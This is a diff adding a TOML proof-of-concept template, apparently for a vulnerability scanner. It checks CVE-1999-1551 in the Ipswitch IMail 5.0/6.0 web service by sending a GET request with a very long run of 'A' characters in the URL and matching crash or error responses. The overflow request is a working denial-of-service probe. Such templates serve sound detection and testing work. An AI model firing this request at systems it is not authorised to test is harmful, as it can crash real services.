@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "验证 Ipswitch IMail 5.0/6.0 Web 服务缓冲区溢出漏洞。该漏洞源于 IMail Web 服务对请求 URL 长度处理不当，远程攻击者可发送超长 URL 触发缓冲区溢出，导致服务进程崩溃（拒绝服务）。本 PoC 通过向目标 Web 服务发送一条超长 URL 的 GET 请求，若服务无响应或连接被重置，则说明目标存在此溢出漏洞。"
+id = "POC-AVE-1999-1179"
+name = "CVE-1999-1551 Ipswitch IMail Web Service Buffer Overflow PoC"
+severity = "medium"
+tags = ["ave-1999-1179"]
+vuln_id = [
+    "CVE-1999-1551",
+    "AVE-1999-1179",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection reset",
+    "Connection closed",
+    "Bad request",
+    "Server Error",
+]
